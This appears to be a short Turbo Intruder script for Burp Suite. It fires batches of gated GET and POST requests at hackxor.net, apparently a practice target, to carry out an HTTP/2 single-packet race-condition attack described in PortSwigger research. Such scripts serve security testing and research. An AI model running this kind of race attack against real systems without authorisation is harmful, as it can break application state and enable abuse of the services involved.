def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://hackxor.net:443',
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    req1 = r'''GET /static/robots.txt?%s=test HTTP/1.1
Host: hackxor.net

'''

    req2 = r'''POST /static/robots.txt?%s=test HTTP/1.1
Host: hackxor.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

'''

    for i in range(5):
        engine.queue(req1, 'search', gate='race1')
        engine.queue(req2, 'hidden', gate='race1')

    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
